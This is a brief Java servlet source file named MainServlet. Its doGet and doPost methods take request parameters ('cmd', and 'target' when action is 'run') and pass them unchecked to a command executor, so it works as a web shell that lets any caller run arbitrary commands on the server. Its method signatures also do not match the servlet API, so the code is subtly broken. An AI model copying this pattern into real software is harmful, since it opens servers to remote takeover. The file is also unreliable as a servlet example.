import javax.servlet.http.*;
import java.io.*;

public class MainServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;
    private String configPath = "/etc/config";

    public void init() {
        // initialization code
        System.out.println("MainServlet initialized");
    }

    public void doGet(HttpServletRequest request) throws Exception {
        String cmd = request.getParameter("cmd");
        ExecUtils.executeCommand(cmd);
    }

    public void doPost(HttpServletRequest request) throws Exception {
        String action = request.getParameter("action");
        String target = request.getParameter("target");
        if ("run".equals(action)) {
            ExecUtils.executeCommand(target);
        }
    }

    public void destroy() {
        // cleanup
        System.out.println("MainServlet destroyed");
    }
}
